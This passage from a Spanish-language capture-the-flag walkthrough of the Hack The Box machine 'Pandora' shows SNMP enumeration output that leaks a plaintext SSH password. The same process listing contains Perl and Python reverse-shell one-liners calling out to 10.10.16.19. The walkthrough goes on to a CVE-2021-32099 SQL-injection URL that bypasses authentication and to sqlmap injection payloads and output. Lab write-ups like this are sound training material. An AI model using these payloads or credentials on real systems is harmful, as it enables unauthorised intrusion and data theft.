-f                  <br>  798                   runnable              cron                  /usr/sbin/CRON        -f                  <br>  801                   runnable              dbus-daemon           /usr/bin/dbus-daemon  --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only<br>  802                   runnable              sh                    /bin/sh               -c sleep 30; /bin/bash -c <span class="hljs-string">&#x27;/usr/bin/host_check -u daniel -p HotelBabylon23&#x27;</span><br>  811                   runnable              irqbalance            /usr/sbin/irqbalance  --foreground        <br>  814                   runnable              networkd-dispat       /usr/bin/python3      /usr/bin/networkd-dispatcher --run-startup-triggers<br>  817                   runnable              rsyslogd              /usr/sbin/rsyslogd    -n -iNONE           <br>  821                   runnable              systemd-logind        /lib/systemd/systemd-logind                      <br>  830                   runnable              apache2               /usr/sbin/apache2     -k start            <br>  831                   runnable              udisksd               /usr/lib/udisks2/udisksd                      <br>  832                   runnable              atd                   /usr/sbin/atd         -f                  <br>  834                   running               snmpd                 /usr/sbin/snmpd       -LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid<br>  835                   runnable              sshd                  sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups                      <br>  967                   runnable              agetty                /sbin/agetty          -o -p -- \u --noclear tty1 linux<br>  968                   runnable              mysqld                /usr/sbin/mysqld                          <br>  977                   runnable              polkitd               /usr/lib/policykit-1/polkitd  --no-debug          <br>  1035                  runnable              apache2               /usr/sbin/apache2     -k start            <br>  1036                  runnable              apache2               /usr/sbin/apache2     -k start            <br>  1050                  runnable              apache2               /usr/sbin/apache2     -k start            <br>  1135                  runnable              host_check            /usr/bin/host_check   -u daniel -p HotelBabylon23<br>  1139                  runnable              sshd                  sshd: daniel [priv]                       <br>  1158                  runnable              systemd               /lib/systemd/systemd  --user              <br>  1159                  runnable              (sd-pam)              (sd-pam)                                  <br>  1288                  runnable              sshd                  sshd: daniel@pts/0                        <br>  1290                  runnable              bash                  -bash                                     <br>  1307                  runnable              apache2               /usr/sbin/apache2     -k start            <br>  1314                  runnable              apache2               /usr/sbin/apache2     -k start            <br>  1325                  runnable              apache2               /usr/sbin/apache2     -k start            <br>  1341                  runnable              apache2               /usr/sbin/apache2     -k start            <br>  1361                  runnable              apache2               /usr/sbin/apache2     -k start            <br>  1503                  runnable              apache2               /usr/sbin/apache2     -k start            <br>  1534                  runnable              apache2               /usr/sbin/apache2     -k start            <br>  1537                  runnable              sh                    sh                    -c perl -e <span class="hljs-string">&#x27;use Socket;$i=&quot;10.10.16.19&quot;;$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,</span><br><span class="hljs-string">  1538                  runnable              sh                    /bin/sh               -i                  </span><br><span class="hljs-string">  1553                  runnable              apache2               /usr/sbin/apache2     -k start            </span><br><span class="hljs-string">  1554                  runnable              apache2               /usr/sbin/apache2     -k start            </span><br><span class="hljs-string">  1563                  runnable              python3               python3               -c import pty;pty.spawn(&quot;/bin/bash&quot;)</span><br><span class="hljs-string">  1564                  runnable              bash                  /bin/bash                                 </span><br><span class="hljs-string">  40907                 unknown               kworker/u4:0-events_power_efficient                                            </span><br><span class="hljs-string">  255947                runnable              gpg-agent             gpg-agent             --homedir /home/matt/.gnupg --use-standard-socket --daemon</span><br><span class="hljs-string">  488190                unknown               kworker/1:1-events                                              </span><br><span class="hljs-string">  488748                unknown               kworker/0:1-events                                              </span><br><span class="hljs-string">  528561                unknown               kworker/1:0-events                                              </span><br><span class="hljs-string">  528720                unknown               kworker/u4:1-flush-253:0                                            </span><br><span class="hljs-string">  528721                unknown               kworker/0:0-events                                              </span><br><span class="hljs-string">  528832                unknown               kworker/u4:2-events_power_efficient                                            </span><br><span class="hljs-string">  528886                runnable              apache2               /usr/sbin/apache2     -k start            </span><br><span class="hljs-string">  528887                runnable              sh                    sh                    -c python3 -c &#x27;</span>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;10.10.16.19&quot;</span>,1234));os<br>  528888                runnable              python3               python3               -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;10.10.16.19&quot;</span>,1234));os.dup2(s.file<br>  528889                runnable              bash                  /bin/bash             -i                  <br><br>[*] Storage information:<br><br>  Description                   : [<span class="hljs-string">&quot;Physical memory&quot;</span>]<br>  Device id                     : [<span class="hljs-comment">#&lt;SNMP::Integer:0x0000aaaad94ffb08 @value=1&gt;]</span><br>  Filesystem <span class="hljs-built_in">type</span>               : [<span class="hljs-string">&quot;unknown&quot;</span>]<br>  Device unit                   : [<span class="hljs-comment">#&lt;SNMP::Integer:0x0000aaaad94fdf10 @value=1024&gt;]</span><br>  Memory size                   : 3.84 GB<br>  Memory used                   : 1.07 GB<br><br>  Description                   : [<span class="hljs-string">&quot;Virtual memory&quot;</span>]<br>  Device id                     : [<span class="hljs-comment">#&lt;SNMP::Integer:0x0000aaaad95d4f88 @value=3&gt;]</span><br>  Filesystem <span class="hljs-built_in">type</span>               : [<span class="hljs-string">&quot;unknown&quot;</span>]<br>  Device unit                   : [<span class="hljs-comment">#&lt;SNMP::Integer:0x0000aaaad95d3368 @value=1024&gt;]</span><br>  Memory size                   : 4.51 GB<br>  Memory used                   : 1.07 GB<br><br>  Description                   : [<span class="hljs-string">&quot;Memory buffers&quot;</span>]<br>  Device id                     : [<span class="hljs-comment">#&lt;SNMP::Integer:0x0000aaaad95ce458 @value=6&gt;]</span><br>  Filesystem <span class="hljs-built_in">type</span>               : [<span class="hljs-string">&quot;unknown&quot;</span>]<br>  Device unit                   : [<span class="hljs-comment">#&lt;SNMP::Integer:0x0000aaaad95cc838 @value=1024&gt;]</span><br>  Memory size                   : 3.84 GB<br>  Memory used                   : 125.84 MB<br><br>  Description                   : [<span class="hljs-string">&quot;Cached memory&quot;</span>]<br>  Device id                     : [<span class="hljs-comment">#&lt;SNMP::Integer:0x0000aaaad95c77e8 @value=7&gt;]</span><br>  Filesystem <span class="hljs-built_in">type</span>               : [<span class="hljs-string">&quot;unknown&quot;</span>]<br>  Device unit                   : [<span class="hljs-comment">#&lt;SNMP::Integer:0x0000aaaad95c5c18 @value=1024&gt;]</span><br>  Memory size                   : 410.78 MB<br>  Memory used                   : 410.78 MB<br><br>  Description                   : [<span class="hljs-string">&quot;Shared memory&quot;</span>]<br>  Device id                     : [<span class="hljs-comment">#&lt;SNMP::Integer:0x0000aaaad95c0c68 @value=8&gt;]</span><br>  Filesystem <span class="hljs-built_in">type</span>               : [<span class="hljs-string">&quot;unknown&quot;</span>]<br>  Device unit                   : [<span class="hljs-comment">#&lt;SNMP::Integer:0x0000aaaad95bf070 @value=1024&gt;]</span><br>  Memory size                   : 12.41 MB<br>  Memory used                   : 12.41 MB<br><br>  Description                   : [<span class="hljs-string">&quot;Swap space&quot;</span>]<br>  Device id                     : [<span class="hljs-comment">#&lt;SNMP::Integer:0x0000aaaad95ba188 @value=10&gt;]</span><br>  Filesystem <span class="hljs-built_in">type</span>               : [<span class="hljs-string">&quot;unknown&quot;</span>]<br>  Device unit                   : [<span class="hljs-comment">#&lt;SNMP::Integer:0x0000aaaad95b8568 @value=1024&gt;]</span><br>  Memory size                   : 680.00 MB<br>  Memory used                   : 0 bytes<br><br>  Description                   : [<span class="hljs-string">&quot;/run&quot;</span>]<br>  Device id                     : [<span class="hljs-comment">#&lt;SNMP::Integer:0x0000aaaad95b3630 @value=35&gt;]</span><br>  Filesystem <span class="hljs-built_in">type</span>               : [<span class="hljs-string">&quot;unknown&quot;</span>]<br>  Device unit                   : [<span class="hljs-comment">#&lt;SNMP::Integer:0x0000aaaad95b1a38 @value=4096&gt;]</span><br>  Memory size                   : 393.61 MB<br>  Memory used                   : 1.07 MB<br><br>  Description                   : [<span class="hljs-string">&quot;/&quot;</span>]<br>  Device id                     : [<span class="hljs-comment">#&lt;SNMP::Integer:0x0000aaaad95acad8 @value=36&gt;]</span><br>  Filesystem <span class="hljs-built_in">type</span>               : [<span class="hljs-string">&quot;unknown&quot;</span>]<br>  Device unit                   : [<span class="hljs-comment">#&lt;SNMP::Integer:0x0000aaaad95aaee0 @value=4096&gt;]</span><br>  Memory size                   : 4.87 GB<br>  Memory used                   : 3.07 GB<br><br>  Description                   : [<span class="hljs-string">&quot;/dev/shm&quot;</span>]<br>  Device id                     : [<span class="hljs-comment">#&lt;SNMP::Integer:0x0000aaaad95a5f58 @value=38&gt;]</span><br>  Filesystem <span class="hljs-built_in">type</span>               : [<span class="hljs-string">&quot;unknown&quot;</span>]<br>  Device unit                   : [<span class="hljs-comment">#&lt;SNMP::Integer:0x0000aaaad95a4388 @value=4096&gt;]</span><br>  Memory size                   : 1.92 GB<br>  Memory used                   : 0 bytes<br><br>  Description                   : [<span class="hljs-string">&quot;/run/lock&quot;</span>]<br>  Device id                     : [<span class="hljs-comment">#&lt;SNMP::Integer:0x0000aaaad9543498 @value=39&gt;]</span><br>  Filesystem <span class="hljs-built_in">type</span>               : [<span class="hljs-string">&quot;unknown&quot;</span>]<br>  Device unit                   : [<span class="hljs-comment">#&lt;SNMP::Integer:0x0000aaaad95418c8 @value=4096&gt;]</span><br>  Memory size                   : 5.00 MB<br>  Memory used                   : 0 bytes<br><br>  Description                   : [<span class="hljs-string">&quot;/sys/fs/cgroup&quot;</span>]<br>  Device id                     : [<span class="hljs-comment">#&lt;SNMP::Integer:0x0000aaaad952c9f0 @value=40&gt;]</span><br>  Filesystem <span class="hljs-built_in">type</span>               : [<span class="hljs-string">&quot;unknown&quot;</span>]<br>  Device unit                   : [<span class="hljs-comment">#&lt;SNMP::Integer:0x0000aaaad952ad80 @value=4096&gt;]</span><br>  Memory size                   : 1.92 GB<br>  Memory used                   : 0 bytes<br><br>  Description                   : [<span class="hljs-string">&quot;/boot&quot;</span>]<br>  Device id                     : [<span class="hljs-comment">#&lt;SNMP::Integer:0x0000aaaad9555e18 @value=63&gt;]</span><br>  Filesystem <span class="hljs-built_in">type</span>               : [<span class="hljs-string">&quot;unknown&quot;</span>]<br>  Device unit                   : [<span class="hljs-comment">#&lt;SNMP::Integer:0x0000aaaad9554248 @value=4096&gt;]</span><br>  Memory size                   : 219.97 MB<br>  Memory used                   : 201.03 MB<br><br>  Description                   : [<span class="hljs-string">&quot;/run/user/1001&quot;</span>]<br>  Device id                     : [<span class="hljs-comment">#&lt;SNMP::Integer:0x0000aaaad959f270 @value=64&gt;]</span><br>  Filesystem <span class="hljs-built_in">type</span>               : [<span class="hljs-string">&quot;unknown&quot;</span>]<br>  Device unit                   : [<span class="hljs-comment">#&lt;SNMP::Integer:0x0000aaaad959d600 @value=4096&gt;]</span><br>  Memory size                   : 393.61 MB<br>  Memory used                   : 0 bytes<br><br><br>[*] Device information:<br><br>  Id                    Type                  Status                Descr               <br>  196608                unknown               running               AuthenticAMD: AMD EPYC 7401P 24-Core Processor<br>  196609                unknown               running               AuthenticAMD: AMD EPYC 7401P 24-Core Processor<br>  262145                unknown               running               network interface lo<br>  262146                unknown               running               network interface eth0<br>  786432                unknown               unknown               Guessing that there<span class="hljs-string">&#x27;s a floating point co-processor</span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] Software components:</span><br><span class="hljs-string"></span><br><span class="hljs-string">  Index                 Name                </span><br><span class="hljs-string">  1                     accountsservice_0.6.55-0ubuntu12~20.04.5_amd64</span><br><span class="hljs-string">  2                     adduser_3.118ubuntu2_all</span><br><span class="hljs-string">  3                     alsa-topology-conf_1.2.2-1_all</span><br><span class="hljs-string">  4                     alsa-ucm-conf_1.2.2-1ubuntu0.11_all</span><br><span class="hljs-string">  5                     amd64-microcode_3.20191218.1ubuntu1_amd64</span><br><span class="hljs-string">  6                     apache2_2.4.41-4ubuntu3.8_amd64</span><br><span class="hljs-string">  7                     apache2-bin_2.4.41-4ubuntu3.8_amd64</span><br><span class="hljs-string">  8                     apache2-data_2.4.41-4ubuntu3.8_all</span><br><span class="hljs-string">  9                     apache2-utils_2.4.41-4ubuntu3.8_amd64</span><br><span class="hljs-string">  10                    apparmor_2.13.3-7ubuntu5.1_amd64</span><br><span class="hljs-string">  .</span><br><span class="hljs-string">  .</span><br><span class="hljs-string">  .</span><br><span class="hljs-string">  816                   xxd_2:8.1.2269-1ubuntu5.4_amd64</span><br><span class="hljs-string">  817                   xz-utils_5.2.4-1ubuntu1_amd64</span><br><span class="hljs-string">  818                   zerofree_1.1.1-1_amd64</span><br><span class="hljs-string">  819                   zip_3.0-11build1_amd64</span><br><span class="hljs-string">  820                   zlib1g_1:1.2.11.dfsg-2ubuntu1.2_amd64</span><br></code></pre></td></tr></table></figure><h3 id="4-Obtener-credenciales-de-acceso-al-sistema"><a href="#4-Obtener-credenciales-de-acceso-al-sistema" class="headerlink" title="4. Obtener credenciales de acceso al sistema"></a>4. Obtener credenciales de acceso al sistema</h3><p>Después de obtener el output del servicio SNMP, podemos ver que en uno de los registros se está ejecutando un programa llamado “/usr/bin/host_check” con crenciales.</p><p><img src="/img/Walkthrough/HTB/Pandora/user_log.png" alt="Figura 2: Credenciales usuario Daniel"></p><p>Si tratamos de conectarnos via <strong>ssh</strong> con estas credenciales, lograremos logearnos con el usuario <strong>Daniel</strong>.</p><h2 id="Task-2-Foothold"><a href="#Task-2-Foothold" class="headerlink" title="Task 2 - Foothold"></a>Task 2 - Foothold</h2><p>Una vez entramos con la sesión de Daniel, lo primero que debemos hacer es buscar la flag <strong>user.txt</strong>. Lamentablemente, este fichero se encuentra en el usuario <strong>matt</strong>, al cual no tenemos permisos de lectura para su directorio.</p><h3 id="1-Investigar-directorios-web"><a href="#1-Investigar-directorios-web" class="headerlink" title="1. Investigar directorios web"></a>1. Investigar directorios web</h3><p>En la primera fase de reconocimiento, hemos visto que existe una web corriendo en el puerto 80 TCP. Por esa razón, es bueno investigar el directorio <strong>/var/www</strong>, las cuales nos muestra 2 directorios de interes: <strong>/var/www/html</strong> y <strong>/var/www/pandora</strong></p><h4 id="1-1-var-www-html"><a href="#1-1-var-www-html" class="headerlink" title="1.1 /var/www/html"></a>1.1 /var/www/html</h4><p>Este directorio hace referencia a la web que nosotros accediamos cuando navegabamos a <strong>pandora.htb:80</strong>.<br>No hay información adicional respecto a lo que ya sabíamos. Por lo tanto, descartamos continuar por aquí.</p><h4 id="1-2-var-www-pandora"><a href="#1-2-var-www-pandora" class="headerlink" title="1.2 /var/www/pandora"></a>1.2 /var/www/pandora</h4><p>El fichero <strong>/var/www/pandora/index.html</strong> nos carga un template de un panel de administración. Eso significa que el directorio <strong>/var/www/pandora/pandora_console</strong> debe estar la configuración de dicha web.</p><p>Después de investigar diferentes ficheros de logs, configuraciones de Docker, etc. Solamente he podido obtener información de que base de datos utiliza. Pero no he podido obtener más información aparte de que los ficheros de este directorio corresponden a <strong>matt</strong>. Si conseguimos explotar el servicio, podremos obtener privilegios del usuario propietario <strong>matt</strong>.</p><h3 id="2-Revisar-conexiones-en-el-fichero-etc-hosts"><a href="#2-Revisar-conexiones-en-el-fichero-etc-hosts" class="headerlink" title="2. Revisar conexiones en el fichero /etc/hosts"></a>2. Revisar conexiones en el fichero /etc/hosts</h3><p>El que haya 2 webs distintas ejecutandose al mismo tiempo, me da a pensar que deben existir diferentes subdominios o solamente son accesibles mediante puertos locales.</p><p>Si leemos el fichero /etc/hosts desde el usuario <strong>daniel</strong> obtendremos el siguiente resultado:<br><img src="/img/Walkthrough/HTB/Pandora/hosts.png" alt="Figura 3: Fichero /etc/hosts de la máquina Pandora"></p><p>Para poder acceder a dicha web (o subdominio) desde nuestro equipo, deberemos redirigir su puerto 80 de localhost a un puerto local de nuestra máquina. Os dejo el siguiente enlace para que veais el mecanismo: <a href="https://book.hacktricks.xyz/tunneling-and-port-forwarding#port2port">https://book.hacktricks.xyz/tunneling-and-port-forwarding#port2port</a></p><p>En este caso he utilizado el puerto <strong>1234</strong>. </p><p>Input:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo ssh daniel@pandora.htb -L 1234:localhost:80<br></code></pre></td></tr></table></figure><p>Una vez se establezca la conexión, si accedemos desde nuestro navegador a la url: <a href="http://localhost:1234/">http://localhost:1234</a><br>Veremos que accedemos a la web de <strong>Pandora Console</strong> de la máquina víctima..</p><p><img src="/img/Walkthrough/HTB/Pandora/pandora_console.png" alt="Figura 4: Panel de login de Pandora Console"></p><h2 id="Task-3-Obtener-user-txt"><a href="#Task-3-Obtener-user-txt" class="headerlink" title="Task 3 - Obtener user.txt"></a>Task 3 - Obtener user.txt</h2><p>Si probamos las credenciales de Daniel o cualquier otro tipo de credenciales por defecto, veremos que no tenemos permisos para acceder.</p><h3 id="1-Metodo-CVE-2021-32099"><a href="#1-Metodo-CVE-2021-32099" class="headerlink" title="1. Método CVE-2021-32099"></a>1. Método CVE-2021-32099</h3><p>Investigando por internet acerca de <strong>Pandora FMS</strong>, encontré un link que explicaba que la versión 742 de dicho servicio es vulnerable a <strong>SQLInjection</strong> en la fase de <strong>pre-autenticación</strong>. Os dejo más información en el siguiente enlace: <a href="https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained">https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained</a></p><p>Esta aplicación es vulnerable al <a href="https://github.com/ibnuuby/CVE-2021-32099">CVE-2021-32099</a>. Este codigo de Github viene coded. Para poder enviar la petición via url, deberemos primero decodear dichar URL. Yo utilizo la siguiente plataforma para este tipo de tareas: <a href="https://www.urlencoder.org/">https://www.urlencoder.org</a></p><p>URL encoded</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://localhost:1234/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271<br></code></pre></td></tr></table></figure><p>URL decoded</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://localhost:1234/pandora_console/include/chart_generator.php?session_id=a<span class="hljs-string">&#x27; UNION SELECT &#x27;</span>a<span class="hljs-string">&#x27;,1,&#x27;</span>id_usuario|s:5:<span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-string">&#x27; as data FROM tsessions_php WHERE &#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br></code></pre></td></tr></table></figure><p>Si introducimos la siguiente URL decodeada, nos llevara a una web totalmente en blanco. Ahora simplemente deberemos navegar a <a href="http://localhost:1234/pandora_console/">http://localhost:1234/pandora_console/</a>. Esta nos redireccionará al panel bypasendo la autenticación.</p><p><img src="/img/Walkthrough/HTB/Pandora/panel.png" alt="Figura 5: Panel de administración de Pandora Console"></p><h3 id="2-Metodo-SQL-Injection-CVE-2020-26518-INFORMACION-EXTRA"><a href="#2-Metodo-SQL-Injection-CVE-2020-26518-INFORMACION-EXTRA" class="headerlink" title="2. Método SQL Injection (CVE-2020-26518) (INFORMACIÓN EXTRA)"></a>2. Método SQL Injection (CVE-2020-26518) (INFORMACIÓN EXTRA)</h3><p>Según el CVE-2020-26518, la versión de Pandora FMS 7.0 concretamente tiene una vulnerabilidad de SQL Injection en el parametro <strong>session_id</strong> de la url: <a href="http://pandora.htb/pandora_console/include/chart_generator.php?session_id=1">http://pandora.htb/pandora_console/include/chart_generator.php?session_id=1</a> .<br>Para aprovecharnos, utilizaremos la herramienta <strong>sqlmap</strong> para de forma automátizada, poder obtener el acceso a la base de datos y obtener la información de las tablas.</p><p>Input:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://127.0.0.1:1234/pandora_console/include/chart_generator.php?session_id=1 --batch --tables<br></code></pre></td></tr></table></figure><p>Output:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br></pre></td><td class="code"><pre><code class="hljs bash">        ___<br>       __H__<br> ___ ___[(]_____ ___ ___  &#123;1.6.5<span class="hljs-comment">#stable&#125;</span><br>|_ -| . [<span class="hljs-string">&#x27;]     | .&#x27;</span>| . |<br>|___|_  [<span class="hljs-string">&#x27;]_|_|_|__,|  _|</span><br><span class="hljs-string">      |_|V...       |_|   https://sqlmap.org</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="hljs-built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="hljs-keyword">for</span> any misuse or damage caused by this program<br><br>[*] starting @ 19:12:32 /2022-05-17/<br><br>[19:12:33] [INFO] resuming back-end DBMS <span class="hljs-string">&#x27;mysql&#x27;</span> <br>[19:12:33] [INFO] testing connection to the target URL<br>[19:12:33] [WARNING] potential permission problems detected (<span class="hljs-string">&#x27;Access denied&#x27;</span>)<br>you have not declared cookie(s), <span class="hljs-keyword">while</span> server wants to <span class="hljs-built_in">set</span> its own (<span class="hljs-string">&#x27;PHPSESSID=7op42dru8pe...udom49id2u&#x27;</span>). Do you want to use those [Y/n] Y<br>sqlmap resumed the following injection point(s) from stored session:<br>---<br>Parameter: session_id (GET)<br>    Type: boolean-based blind<br>    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)<br>    Payload: session_id=-7108<span class="hljs-string">&#x27; OR 8061=8061#</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Type: error-based</span><br><span class="hljs-string">    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="hljs-string">    Payload: session_id=1&#x27;</span> OR (SELECT 4003 FROM(SELECT COUNT(*),CONCAT(0x716a716a71,(SELECT (ELT(4003=4003,1))),0x717a7a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- iIyK<br><br>    Type: time-based blind<br>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br>    Payload: session_id=1<span class="hljs-string">&#x27; AND (SELECT 5227 FROM (SELECT(SLEEP(5)))JaGX)-- vnGN</span><br><span class="hljs-string">---</span><br><span class="hljs-string">[19:12:33] [INFO] the back-end DBMS is MySQL</span><br><span class="hljs-string">web server operating system: Linux Ubuntu 19.10 or 20.04 or 20.10 (focal or eoan)</span><br><span class="hljs-string">web application technology: PHP, Apache 2.4.41</span><br><span class="hljs-string">back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)</span><br><span class="hljs-string">[19:12:33] [INFO] fetching database names</span><br><span class="hljs-string">[19:12:33] [INFO] resumed: &#x27;</span>information_schema<span class="hljs-string">&#x27;</span><br><span class="hljs-string">[19:12:33] [INFO] resumed: &#x27;</span>pandora<span class="hljs-string">&#x27;</span><br><span class="hljs-string">[19:12:33] [INFO] fetching tables for databases: &#x27;</span>information_schema, pandora<span class="hljs-string">&#x27;</span><br><span class="hljs-string">Database: information_schema</span><br><span class="hljs-string">[78 tables]</span><br><span 